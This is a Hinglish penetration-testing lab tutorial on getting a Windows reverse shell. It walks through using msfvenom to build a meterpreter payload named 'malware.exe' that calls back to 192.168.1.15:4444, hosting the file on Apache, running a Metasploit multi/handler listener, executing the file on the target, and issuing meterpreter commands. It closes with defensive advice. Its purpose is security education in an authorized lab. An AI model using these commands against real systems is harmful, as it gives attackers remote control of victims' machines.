# 🛡️ Practical 1 – Windows Reverse Shell (Metasploit + msfvenom)

Aaj hum ek **basic penetration testing lab practical** samjhenge jisme hum:
✔ Payload generate karna
✔ Web server par host karna
✔ Metasploit handler setup karna
✔ Remote Meterpreter session establish karna

⚠️ Ye practical sirf **authorized lab environment (Kali + Windows VM)** ke liye hai.

---

# 1️⃣ Basic Concept 📌

## 📌 Reverse Shell Kya Hota Hai?

Reverse shell ek aisa connection hota hai jisme:

👉 Target machine attacker ko connect karti hai (not vice versa)

Matlab:

* Attacker "wait" karta hai
* Target "connection initiate" karta hai

---

## 🧠 Simple Flow

```
Attacker (Kali)  <------  Target (Windows)
     Listener           Reverse Connection
```

---

# 2️⃣ Lab Setup 🖥️

## 📌 Required Systems:

✔ Kali Linux (Attacker)
✔ Windows VM (Target)
✔ Same network (VirtualBox NAT / Host-only)

---

## 🔎 Network Check

Dono machines ka IP same network me hona chahiye.

Kali IP check:

```bash
ip a
```

Example:

```
192.168.1.15
```

👉 Isko hum **LHOST** bolte hain.

---

# 3️⃣ Payload Generation 🧨 (msfvenom)

## 📌 Purpose:

Windows ke liye ek executable file banana jo run hone par reverse connection kare.

---

## ⚙️ Command:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=4444 -f exe -o malware.exe
```

---

## 🧠 Breakdown:

| Parameter                       | Meaning               |
| ------------------------------- | --------------------- |
| -p                              | Payload type          |
| windows/meterpreter/reverse_tcp | Reverse shell payload |
| LHOST                           | Attacker IP           |
| LPORT                           | Listening port        |
| -f exe                          | Windows executable    |
| -o malware.exe                  | Output file           |

---

## 📌 Output:

✔ malware.exe generate ho jata hai
✔ Ye actual payload file hoti hai

---

# 4️⃣ Web Server Setup 🌐

## 📌 Purpose:

Payload ko host karna taaki target download kar sake.

---

## 📁 Move to Apache Directory:

```bash
cd /var/www/html
```

```bash
mv ~/malware.exe /var/www/html/
```

---

## 🚀 Start Apache Server:

```bash
sudo service apache2 start
```

Check status:

```bash
sudo service apache2 status
```

---

## 🌍 Access Payload:

```
http://192.168.1.15/malware.exe
```

✔ Agar download ho jaye → hosting successful

---

# 5️⃣ Metasploit Framework Start ⚙️

## 📌 Launch Console:

```bash
msfconsole
```

---

# 6️⃣ Handler Setup 🎯

## 📌 Purpose:

Incoming reverse connection ko receive karna.

---

## ⚙️ Steps:

```bash
use exploit/multi/handler
```

---

## 📌 Payload Set:

```bash
set payload windows/meterpreter/reverse_tcp
```

---

## 🌐 Network Config:

```bash
set LHOST 192.168.1.15
set LPORT 4444
```

---

# 7️⃣ Listener Start ▶️

```bash
exploit
```

or

```bash
run
```

---

## 📌 Status:

✔ Metasploit ab waiting mode me hota hai
✔ Connection ka wait karta hai

---

# 8️⃣ Target Execution 💻

## 📌 Process:

Windows VM me:

1. Browser open karo
2. URL open karo:

```
http://192.168.1.15/malware.exe
```

3. File download karo
4. Run karo

---

## ⚠️ Important:

Modern Windows:

* Defender block kar sakta hai
* Unknown exe warning show karega

(Lab me usually disable hota hai)

---

# 9️⃣ Session Establishment 🔗

Agar sab successful hua:

Metasploit me output aayega:

```
Meterpreter session opened
```

---

# 🔟 Meterpreter Basic Commands 🧠

## 📌 System Info:

```bash
sysinfo
```

## 📌 Current User:

```bash
getuid
```

## 📌 Directory Check:

```bash
pwd
```

## 📌 Files List:

```bash
ls
```

---

# 📌 Overall Attack Flow Summary 🔥

```
1. IP check (LHOST)
2. Payload create (msfvenom)
3. Web server setup (Apache)
4. Payload host
5. Metasploit handler start
6. Target download & execute
7. Reverse connection establish
8. Meterpreter session open
```

---

# 🛡️ Security Perspective (Very Important)

## 📌 Why attacks fail today:

✔ Antivirus detection
✔ Firewall blocking
✔ Network isolation
✔ Payload signature detection

---

## 📌 Defense Methods:

✔ Don’t run unknown files
✔ Use updated antivirus
✔ Disable unnecessary downloads
✔ Network monitoring tools

---

# 🎯 Interview Key Points

✔ Reverse shell vs bind shell difference
✔ msfvenom purpose
✔ Meterpreter features
✔ Why LHOST is important
✔ Why same payload must match handler

---

# 🏁 Final Thought

Ye practical cyber security ka **foundation concept** hai:

👉 Payload creation
👉 Network communication
👉 Remote session handling

Agar ye samajh aa gaya →
Next level penetration testing easy ho jata hai 🔥
